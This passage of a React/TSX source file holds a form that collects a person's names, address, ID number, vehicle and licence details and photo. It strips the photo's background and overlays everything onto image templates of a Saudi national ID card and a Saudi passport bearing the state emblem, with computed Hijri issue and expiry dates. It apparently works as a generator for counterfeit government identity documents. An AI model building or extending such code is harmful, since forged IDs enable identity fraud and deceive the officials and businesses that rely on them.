                  {validationErrors.englishSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block text-left" dir="ltr" style={{fontSize: isMobile ? '10px' : '14px'}}>Third Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishThirdName(value);
                      if (validationErrors.englishThirdName) {
                        setValidationErrors(prev => ({ ...prev, englishThirdName: '' }));
                      }
                    }}
                    placeholder="Ahmed"
                    className={`text-left ${validationErrors.englishThirdName ? 'border-red-500' : ''}`}
                    dir="ltr"
                    disabled={isFormLocked}
                  />
                  {validationErrors.englishThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block text-left" dir="ltr" style={{fontSize: isMobile ? '10px' : '14px'}}>Last Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFourthName(value);
                      if (validationErrors.englishFourthName) {
                        setValidationErrors(prev => ({ ...prev, englishFourthName: '' }));
                      }
                    }}
                    placeholder="Alsaudi"
                    className={`text-left ${validationErrors.englishFourthName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                    dir="ltr"
                  />
                  {validationErrors.englishFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* National Address Section */}
            <div className="mb-8">
              <h2 className="font-bold text-gray-700 mb-3 border-b pb-2" style={{fontSize: isMobile ? '11px' : '18px'}}>العنوان الوطني</h2>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-4">
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>المحافظة <span className="text-red-500">*</span></Label>
                  <select
                    value={province}
                    onChange={(e) => {
                      setProvince(e.target.value);
                      setDistrict('');
                      if (validationErrors.province) {
                        setValidationErrors(prev => ({ ...prev, province: '' }));
                      }
                    }}
                    className={`w-full h-10 md:h-12 px-3 py-2 border rounded-md text-right bg-white text-xs md:text-sm ${validationErrors.province ? 'border-red-500' : 'border-gray-300'}`}
                    disabled={isFormLocked}
                  >
                    <option value="">اختر المحافظة</option>
                    {provinces.map(p => (
                      <option key={p} value={p}>{p}</option>
                    ))}
                  </select>
                  {validationErrors.province && <p className="text-red-500 text-xs mt-1">{validationErrors.province}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>المنطقة <span className="text-red-500">*</span></Label>
                  <select
                    value={district}
                    onChange={(e) => {
                      setDistrict(e.target.value);
                      if (validationErrors.district) {
                        setValidationErrors(prev => ({ ...prev, district: '' }));
                      }
                    }}
                    disabled={!province || isFormLocked}
                    className={`w-full h-10 md:h-12 px-3 py-2 border rounded-md text-right bg-white text-xs md:text-sm ${validationErrors.district ? 'border-red-500' : 'border-gray-300'} ${!province ? 'opacity-50 cursor-not-allowed' : ''}`}
                  >
                    <option value="">اختر المنطقة</option>
                    {districts.map(d => (
                      <option key={d} value={d}>{d}</option>
                    ))}
                  </select>
                  {validationErrors.district && <p className="text-red-500 text-xs mt-1">{validationErrors.district}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>اسم الشارع <span className="text-red-500">*</span></Label>
                  <Input
                    value={streetName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setStreetName(value);
                      if (validationErrors.streetName) {
                        setValidationErrors(prev => ({ ...prev, streetName: '' }));
                      }
                    }}
                    placeholder="اسم الشارع"
                    className={`text-right ${validationErrors.streetName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.streetName && <p className="text-red-500 text-xs mt-1">{validationErrors.streetName}</p>}
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>رقم المبنى <span className="text-red-500">*</span></Label>
                  <Input
                    value={buildingNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      setBuildingNumber(value);
                      if (validationErrors.buildingNumber) {
                        setValidationErrors(prev => ({ ...prev, buildingNumber: '' }));
                      }
                    }}
                    placeholder="رقم المبنى"
                    className={`text-right ${validationErrors.buildingNumber ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.buildingNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.buildingNumber}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>الدور <span className="text-red-500">*</span></Label>
                  <Input
                    value={floorNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      setFloorNumber(value);
                      if (validationErrors.floorNumber) {
                        setValidationErrors(prev => ({ ...prev, floorNumber: '' }));
                      }
                    }}
                    placeholder="رقم الدور"
                    className={`text-right ${validationErrors.floorNumber ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.floorNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.floorNumber}</p>}
                </div>
              </div>
            </div>
            
            {/* License Data Section */}
            <div className={`mb-8 ${(isPassportService || isNationalIdService) ? 'hidden' : ''}`}>
              <h2 className="text-[11px] md:text-lg font-bold text-gray-700 mb-3 border-b pb-2">بيانات الرخصة</h2>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Nationality */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">الجنسية <span className="text-red-500">*</span></Label>
                  <select
                    value={nationality}
                    onChange={(e) => setNationality(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    {nationalities.map((nat) => (
                      <option key={nat} value={nat}>{nat}</option>
                    ))}
                  </select>
                </div>
                {/* License Type */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">النوع <span className="text-red-500">*</span></Label>
                  <select
                    value={licenseType}
                    onChange={(e) => setLicenseType(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    {licenseTypes.map((type) => (
                      <option key={type} value={type}>{type}</option>
                    ))}
                  </select>
                </div>
                {/* Blood Type */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">فصيلة الدم <span className="text-red-500">*</span></Label>
                  <select
                    value={bloodType}
                    onChange={(e) => setBloodType(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    {bloodTypes.map((type) => (
                      <option key={type} value={type}>{type}</option>
                    ))}
                  </select>
                </div>
              </div>
            </div>

            {/* Vehicle Information Section */}
            <div className={`mb-6 ${(isPassportService || isNationalIdService || isDrivingLicenseService) ? 'hidden' : ''}`}>
              <h2 className="text-[11px] md:text-lg font-bold text-gray-700 mb-3 border-b pb-2">معلومات المركبة</h2>
              
              {/* License Plate Number - Full Width Row */}
              <div className="mb-4">
                <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">رقم اللوحة <span className="text-red-500">*</span></Label>
                <div className="flex flex-row gap-1 md:gap-2 items-center" dir="ltr">
                  {/* Letter 1 */}
                  <select
                    value={vehiclePlateLetter1}
                    onChange={(e) => setVehiclePlateLetter1(e.target.value)}
                    className="flex-1 h-8 md:h-12 px-1 md:px-2 border border-gray-300 rounded-md text-center bg-white text-[10px] md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر حرف</option>
                    {saudiPlateLetters.map((letter) => (
                      <option key={letter.english} value={letter.english}>{letter.arabic} - {letter.english}</option>
                    ))}
                  </select>
                  {/* Letter 2 */}
                  <select
                    value={vehiclePlateLetter2}
                    onChange={(e) => setVehiclePlateLetter2(e.target.value)}
                    className="flex-1 h-8 md:h-12 px-1 md:px-2 border border-gray-300 rounded-md text-center bg-white text-[10px] md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر حرف</option>
                    {saudiPlateLetters.map((letter) => (
                      <option key={letter.english} value={letter.english}>{letter.arabic} - {letter.english}</option>
                    ))}
                  </select>
                  {/* Letter 3 */}
                  <select
                    value={vehiclePlateLetter3}
                    onChange={(e) => setVehiclePlateLetter3(e.target.value)}
                    className="flex-1 h-8 md:h-12 px-1 md:px-2 border border-gray-300 rounded-md text-center bg-white text-[10px] md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر حرف</option>
                    {saudiPlateLetters.map((letter) => (
                      <option key={letter.english} value={letter.english}>{letter.arabic} - {letter.english}</option>
                    ))}
                  </select>
                  {/* Plate Number */}
                  <Input
                    type="text"
                    value={vehiclePlateNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
                      setVehiclePlateNumber(value);
                    }}
                    placeholder="1234"
                    className="flex-1 h-8 md:h-12 text-center text-[10px] md:text-sm"
                    maxLength={4}
                    disabled={isFormLocked}
                  />
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Chassis Number */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">رقم الهيكل <span className="text-red-500">*</span></Label>
                  <Input
                    type="text"
                    value={vehicleChassisNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
                      setVehicleChassisNumber(value);
                    }}
                    placeholder="أدخل رقم الهيكل"
                    className="w-full h-12 text-right text-xs md:text-sm"
                    disabled={isFormLocked}
                  />
                </div>
                {/* Registration Type */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">نوع التسجيل <span className="text-red-500">*</span></Label>
                  <select
                    value={vehicleRegistrationType}
                    onChange={(e) => setVehicleRegistrationType(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    {vehicleRegistrationTypes.map((type) => (
                      <option key={type} value={type}>{type}</option>
                    ))}
                  </select>
                </div>
                {/* Vehicle Brand */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">ماركة المركبة <span className="text-red-500">*</span></Label>
                  <select
                    value={vehicleBrand}
                    onChange={(e) => {
                      setVehicleBrand(e.target.value);
                      setVehicleModel('');
                      setVehicleBrandCustom('');
                      setVehicleModelCustom('');
                    }}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر الماركة</option>
                    {vehicleBrands.map((brand) => (
                      <option key={brand} value={brand}>{brand}</option>
                    ))}
                  </select>
                  {vehicleBrand === 'أخرى' && (
                    <Input
                      type="text"
                      value={vehicleBrandCustom}
                      onChange={(e) => setVehicleBrandCustom(e.target.value)}
                      placeholder="أدخل اسم الماركة"
                      className="w-full h-12 text-right text-xs md:text-sm mt-2"
                      disabled={isFormLocked}
                    />
                  )}
                </div>
                {/* Vehicle Model */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">طراز المركبة <span className="text-red-500">*</span></Label>
                  {vehicleBrand === 'أخرى' || !vehicleModels[vehicleBrand] || vehicleModels[vehicleBrand].length === 0 ? (
                    <Input
                      type="text"
                      value={vehicleModelCustom}
                      onChange={(e) => setVehicleModelCustom(e.target.value)}
                      placeholder="أدخل طراز المركبة"
                      className="w-full h-12 text-right text-xs md:text-sm"
                      disabled={isFormLocked || !vehicleBrand}
                    />
                  ) : (
                    <>
                      <select
                        value={vehicleModel}
                        onChange={(e) => {
                          setVehicleModel(e.target.value);
                          setVehicleModelCustom('');
                        }}
                        className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                        disabled={isFormLocked || !vehicleBrand}
                      >
                        <option value="">اختر الطراز</option>
                        {(vehicleModels[vehicleBrand] || []).map((model) => (
                          <option key={model} value={model}>{model}</option>
                        ))}
                      </select>
                      {vehicleModel === 'أخرى' && (
                        <Input
                          type="text"
                          value={vehicleModelCustom}
                          onChange={(e) => setVehicleModelCustom(e.target.value)}
                          placeholder="أدخل طراز المركبة"
                          className="w-full h-12 text-right text-xs md:text-sm mt-2"
                          disabled={isFormLocked}
                        />
                      )}
                    </>
                  )}
                </div>
                {/* Vehicle Load */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">حمولة المركبة <span className="text-red-500">*</span></Label>
                  <select
                    value={vehicleLoad}
                    onChange={(e) => setVehicleLoad(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر الحمولة</option>
                    {vehicleLoadCapacities.map((load) => (
                      <option key={load} value={load}>{load}</option>
                    ))}
                  </select>
                </div>
                {/* Vehicle Weight */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">وزن المركبة (كجم) <span className="text-red-500">*</span></Label>
                  <Input
                    type="text"
                    value={vehicleWeight}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, '');
                      setVehicleWeight(value);
                    }}
                    placeholder="أدخل وزن المركبة"
                    className="w-full h-12 text-right text-xs md:text-sm"
                    disabled={isFormLocked}
                  />
                </div>
                {/* Serial Number */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">سنة الصنع <span className="text-red-500">*</span></Label>
                  <select
                    value={vehicleManufactureYear}
                    onChange={(e) => setVehicleManufactureYear(e.target.value)}
                    className="w-full h-12 px-3 border border-gray-300 rounded-md text-right bg-white text-xs md:text-sm"
                    disabled={isFormLocked}
                  >
                    <option value="">اختر السنة</option>
                    {manufactureYears.map((year) => (
                      <option key={year} value={year}>{year}</option>
                    ))}
                  </select>
                </div>
                {/* Serial Number */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">الرقم التسلسلي <span className="text-red-500">*</span></Label>
                  <Input
                    type="text"
                    value={vehicleSerialNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, '');
                      setVehicleSerialNumber(value);
                    }}
                    placeholder="أدخل الرقم التسلسلي"
                    className="w-full h-12 text-right text-xs md:text-sm"
                    disabled={isFormLocked}
                  />
                </div>
                {/* Color */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">اللون <span className="text-red-500">*</span></Label>
                  <Input
                    type="text"
                    value={vehicleColor}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setVehicleColor(value);
                    }}
                    placeholder="أدخل اللون"
                    className="w-full h-12 text-right text-xs md:text-sm"
                    disabled={isFormLocked}
                  />
                </div>
              </div>
              
              {/* Add User Question */}
              <div className="mt-4 p-4 border border-gray-200 rounded-lg bg-gray-50">
                <Label className="text-gray-700 text-[11px] md:text-sm font-semibold mb-3 block">هل ترغب بإضافة مستخدم؟</Label>
                <div className="flex gap-4 mb-3" dir="rtl">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="radio"
                      name="addUser"
                      checked={!wantToAddUser}
                      onChange={() => {
                        setWantToAddUser(false);
                        setVehicleUserId('');
                        setVehicleUserName('');
                      }}
                      className="w-4 h-4 text-blue-600"
                      disabled={isFormLocked}
                    />
                    <span className="text-gray-700 text-xs md:text-sm">لا</span>
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="radio"
                      name="addUser"
                      checked={wantToAddUser}
                      onChange={() => setWantToAddUser(true)}
                      className="w-4 h-4 text-blue-600"
                      disabled={isFormLocked}
                    />
                    <span className="text-gray-700 text-xs md:text-sm">نعم</span>
                  </label>
                </div>
                
                {wantToAddUser && (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
                    {/* User ID */}
                    <div>
                      <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">الرقم الشخصي للمستخدم <span className="text-red-500">*</span></Label>
                      <Input
                        type="text"
                        value={vehicleUserId}
                        onChange={(e) => {
                          const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
                          if (value.length === 0 || value[0] === '1' || value[0] === '2') {
                            setVehicleUserId(value);
                          }
                        }}
                        placeholder="أدخل الرقم الشخصي للمستخدم"
                        className="w-full h-12 text-right text-xs md:text-sm"
                        maxLength={10}
                        disabled={isFormLocked}
                      />
                    </div>
                    {/* User Full Name */}
                    <div>
                      <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">الإسم الكامل للمستخدم <span className="text-red-500">*</span></Label>
                      <Input
                        type="text"
                        value={vehicleUserName}
                        onChange={(e) => {
                          const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                          setVehicleUserName(value);
                        }}
                        placeholder="أدخل الإسم الكامل للمستخدم"
                        className="w-full h-12 text-right text-xs md:text-sm"
                        disabled={isFormLocked}
                      />
                    </div>
                  </div>
                )}
              </div>
            </div>
            
{/* Personal Photo Section */}
            <div className={`mb-8 ${isVehicleLicenseService ? 'hidden' : ''}`}>
              <h3 className="text-base md:text-lg font-semibold text-gray-700 mb-3 text-right">الصورة الشخصية</h3>
              <div className="flex flex-row-reverse items-start gap-4 md:gap-8 justify-end">
                {/* Photo Upload */}
                <div className="flex flex-col items-center gap-4">
                {photoPreview ? (
                  <div className="relative">
                    <img 
                      src={photoPreview} 
                      alt="الصورة الشخصية" 
                      className="w-24 h-24 md:w-40 md:h-40 object-cover rounded-lg border-2 border-gray-300"
                    />
                    {!isFormLocked && (
                      <button
                        type="button"
                        onClick={() => {
                          setPersonalPhoto(null);
                          setPhotoPreview(null);
                        }}
                        className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm hover:bg-red-600"
                      >
                        ×
                      </button>
                    )}
                  </div>
                ) : (
                  <div className="w-24 h-24 md:w-40 md:h-40 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center bg-gray-50">
                    <span className="text-gray-400 text-sm">لا توجد صورة</span>
                  </div>
                )}
                <label className={`cursor-pointer ${isFormLocked ? 'pointer-events-none opacity-50' : ''}`}>
                  <input
                    type="file"
                    accept="image/*"
                    className="hidden"
                    disabled={isFormLocked}
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        setPersonalPhoto(file);
                        const reader = new FileReader();
                        reader.onloadend = () => {
                          const imgSrc = reader.result as string;
                          setPhotoPreview(imgSrc);
                          
                          // Simple white background removal
                          setIsRemovingBg(true);
                          const img = new Image();
                          img.onload = () => {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d', { willReadFrequently: true });
                            if (ctx) {
                              canvas.width = img.naturalWidth;
                              canvas.height = img.naturalHeight;
                              ctx.imageSmoothingEnabled = true;
                              ctx.imageSmoothingQuality = 'high';
                              ctx.drawImage(img, 0, 0);
                              
                              const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                              const data = imageData.data;
                              
                              // Remove white background only
                              for (let i = 0; i < data.length; i += 4) {
                                const r = data[i];
                                const g = data[i + 1];
                                const b = data[i + 2];
                                const brightness = (r + g + b) / 3;
                                
                                // Remove white/light gray background
                                const isGrayish = Math.abs(r - g) < 20 && Math.abs(g - b) < 20;
                                
                                if (brightness > 230 && isGrayish) {
                                  // White/light gray - fully transparent
                                  data[i + 3] = 0;
                                } else if (brightness > 210 && isGrayish) {
                                  // Near white - smooth transition
                                  const alpha = Math.round((230 - brightness) / 20 * 255);
                                  data[i + 3] = 255 - alpha;
                                }
                              }
                              
                              ctx.putImageData(imageData, 0, 0);
                              setPhotoNoBg(canvas.toDataURL('image/png', 1.0));
                            }
                            setIsRemovingBg(false);
                          };
                          img.src = imgSrc;
                        };
                        reader.readAsDataURL(file);
                        if (validationErrors.personalPhoto) {
                          setValidationErrors(prev => ({ ...prev, personalPhoto: '' }));
                        }
                      }
                    }}
                  />
                  <span className="bg-blue-600 hover:bg-blue-700 text-white px-4 md:px-6 py-1.5 md:py-2 rounded-md text-xs md:text-sm inline-block">
                    رفع صورة
                  </span>
                </label>
                {validationErrors.personalPhoto && <p className="text-red-500 text-xs">{validationErrors.personalPhoto}</p>}
              </div>
                {/* Photo Requirements */}
                <div className="text-right text-[10px] md:text-xs text-gray-500 leading-relaxed max-w-[150px] md:max-w-xs">
                  <ul className="list-disc list-inside space-y-1">
                    <li>أن يكون مقاس الصورة 4*6.</li>
                    <li className="text-red-500 font-bold">يجب أن تكون خلفية الصورة بيضاء.</li>
                    <li>لابد من أن يكون صاحب الصورة مرتدي الزي الرسمي.</li>
                    <li>يتاح استلام النظارات الطبية أثناء التقاط الصورة.</li>
                    <li>في حال كان المراد تغيير صورته طفل يلزم عدم ارتدائه غطاء على رأسه.</li>
                  </ul>
                </div>
              </div>
            </div>
            
            {/* Submit Button */}
            <div className="flex justify-end mb-8">
              <Button 
                onClick={handleSubmit}
                className="bg-green-600 hover:bg-green-700 text-white px-4 md:px-8 py-1.5 md:py-2 text-xs md:text-sm min-w-[80px] md:min-w-[100px]"
                disabled={isLoading || isFormLocked}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span>جاري الحفظ...</span>
                  </div>
                ) : 'حفظ'}
              </Button>
            </div>
          </div>
        </div>


        {/* Part 3: National ID */}
        <div className={`mb-8 ${showNationalId ? '' : 'hidden'}`}>
          {/* Title hidden as per requirements */}
          <div className="flex justify-center overflow-x-auto">
            <div className="relative" ref={nationalIdRef} style={{width: '600px', maxWidth: '100%'}}>
              {/* National ID Background */}
              <img 
                src="/national-id-template.png" 
                alt="الهوية الوطنية" 
                className="w-full h-auto rounded-lg shadow-lg"
              />
              {/* Client Photo Overlay */}
              {(photoNoBg || photoPreview) && (
                <div className="absolute top-[24%] left-[5%] w-[24%] h-[50%] overflow-hidden">
                  <img 
                    src={photoNoBg || photoPreview} 
                    alt="صورة العميل" 
                    className="w-full h-full object-cover"
                    crossOrigin="anonymous"
                    style={{
                      imageRendering: '-webkit-optimize-contrast',
                      WebkitBackfaceVisibility: 'hidden',
                      backfaceVisibility: 'hidden',
                      transform: 'translateZ(0)',
                      filter: 'none',
                      WebkitFilter: 'none'
                    }}
                  />
                </div>
              )}
              {/* Arabic Name */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '25%' : '28%',
                  right: '5%',
                  fontSize: isMobile ? '3.5vw' : '18px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                  textAlign: 'right',
                }}
              >
                {arabicFirstName}{arabicFirstName && arabicSecondName ? (gender === 'ذكر' ? ' بن ' : ' بنت ') : ''}{arabicSecondName}{arabicSecondName && arabicThirdName ? ' بن ' : ''}{arabicThirdName}{arabicThirdName && arabicFourthName ? ' ' : ''}{arabicFourthName}
              </span>
              {/* English Name */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '34%' : '34%',
                  right: '5%',
                  fontSize: isMobile ? '2.8vw' : '14px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'ltr',
                  textTransform: 'uppercase',
                  textAlign: 'right',
                }}
              >
                {englishFourthName ? englishFourthName.toUpperCase() + ', ' : ''}{englishFirstName ? englishFirstName.toUpperCase() + ' ' : ''}{englishSecondName ? englishSecondName.toUpperCase() + ' ' : ''}{englishThirdName ? englishThirdName.charAt(0).toUpperCase() : ''}
              </span>
              {/* National ID Number */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '40%' : '42%',
                  right: '18%',
                  fontSize: isMobile ? '3.5vw' : '14px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                }}
              >
                {nationalId.replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)])}
              </span>
              {/* Expiry Date - 10 years from now */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '50%' : '52%',
                  right: '18%',
                  fontSize: isMobile ? '3.5vw' : '14px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                }}
              >
                {(() => {
                  // Get current Hijri date and add 10 years
                  const now = new Date();
                  const gY = now.getFullYear();
                  const gM = now.getMonth() + 1;
                  const gD = now.getDate();
                  
                  // Julian Day calculation
                  const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) +
                             Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) -
                             Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) +
                             gD - 32075;
                  
                  // Hijri calculation
                  const l = jd - 1948440 + 10632;
                  const n = Math.floor((l - 1) / 10631);
                  const l2 = l - 10631 * n + 354;
                  const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) +
                            Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                  const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) -
                             Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                  const hM = Math.floor((24 * l3) / 709);
                  const hD = l3 - Math.floor((709 * hM) / 24);
                  const hY = 30 * n + j - 30 + 10; // Add 10 years
                  
                  const toArabicNum = (num: number, pad: number = 2) => num.toString().padStart(pad, '0').replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                  return `${toArabicNum(hY, 4)}/${toArabicNum(hM)}/${toArabicNum(hD)}`;
                })()}
              </span>
              {/* Hijri Birth Date */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '67%' : '69%',
                  right: '18%',
                  fontSize: isMobile ? '4vw' : '16px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                }}
              >
                {hijriDate.day && hijriDate.month && hijriDate.year 
                  ? (() => {
                      const toArabicNum = (num: string, pad: number = 2) => num.padStart(pad, '0').replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                      return `${toArabicNum(hijriDate.year, 4)}/${toArabicNum(hijriDate.month)}/${toArabicNum(hijriDate.day)}`;
                    })() 
                  : calendarType === 'gregorian' && dateOfBirth 
                    ? (() => {
                        // Convert Gregorian to Hijri
                        const gDate = new Date(dateOfBirth);
                        const gY = gDate.getFullYear();
                        const gM = gDate.getMonth() + 1;
                        const gD = gDate.getDate();
                        
                        // Julian Day calculation
                        const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) +
                                   Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) -
                                   Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) +
                                   gD - 32075;
                        
                        // Hijri calculation
                        const l = jd - 1948440 + 10632;
                        const n = Math.floor((l - 1) / 10631);
                        const l2 = l - 10631 * n + 354;
                        const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) +
                                  Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                        const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) -
                                   Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                        const hM = Math.floor((24 * l3) / 709);
                        const hD = l3 - Math.floor((709 * hM) / 24);
                        const hY = 30 * n + j - 30;
                        
                        const toArabicNum = (num: number, pad: number = 2) => num.toString().padStart(pad, '0').replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                        return `${toArabicNum(hY, 4)}/${toArabicNum(hM)}/${toArabicNum(hD)}`;
                      })()
                    : ''}
              </span>
              {/* Birth Place */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '59%' : '61%',
                  right: '18%',
                  fontSize: isMobile ? '3.5vw' : '14px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                }}
              >
                {district}
              </span>
            </div>
          </div>
        </div>

        {/* Part 2 New: Passport (Separate Section) */}
        <div className={`mb-8 ${showPassport ? '' : 'hidden'}`}>
          {/* Title hidden as per requirements */}
          <div className="flex justify-center">
                  <div className="relative" ref={passportRef} style={{width: '600px', maxWidth: '100%'}}>
                    {/* Saudi Passport - Empty Background with Emblem */}
                  <img 
                    src="/images/passport-empty-bg.png" 
                    alt="جواز سفر سعودي" 
                    className="max-w-full h-auto rounded-lg shadow-lg"
                  />
                  {/* Saudi Emblem - Palm and Swords */}
                  <img 
                    src="/images/saudi-emblem.png" 
                    alt="شعار المملكة" 
                    className="absolute top-[5%] left-1/2 transform -translate-x-1/2" style={{width: '10%'}}
                  />
                  <span className="absolute top-[24%] left-1/2 transform -translate-x-1/2 text-[#0D5C3D] font-semibold" style={{fontSize: isMobile ? '1.5%' : '9px'}}>Country Code</span>
